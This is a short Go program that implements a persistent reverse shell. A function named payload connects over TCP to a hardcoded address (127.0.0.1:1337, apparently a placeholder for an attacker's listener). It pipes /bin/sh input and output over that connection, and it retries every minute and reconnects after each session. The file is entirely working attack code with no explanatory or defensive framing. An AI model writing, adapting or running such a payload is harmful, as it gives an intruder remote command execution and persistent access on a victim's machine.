package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	payload("127.0.0.1:1337")
}

func payload(host string) {
	conn, error_tcp := net.Dial("tcp", host)
	if error_tcp != nil {
		if conn != nil {
			conn.Close()
		}

		time.Sleep(time.Minute)
		payload(host)
	}

	shell := exec.Command("/bin/sh")
	shell.Stdin, shell.Stdout, shell.Stderr = conn, conn, conn
	shell.Run()
	conn.Close()
	payload(host)
}
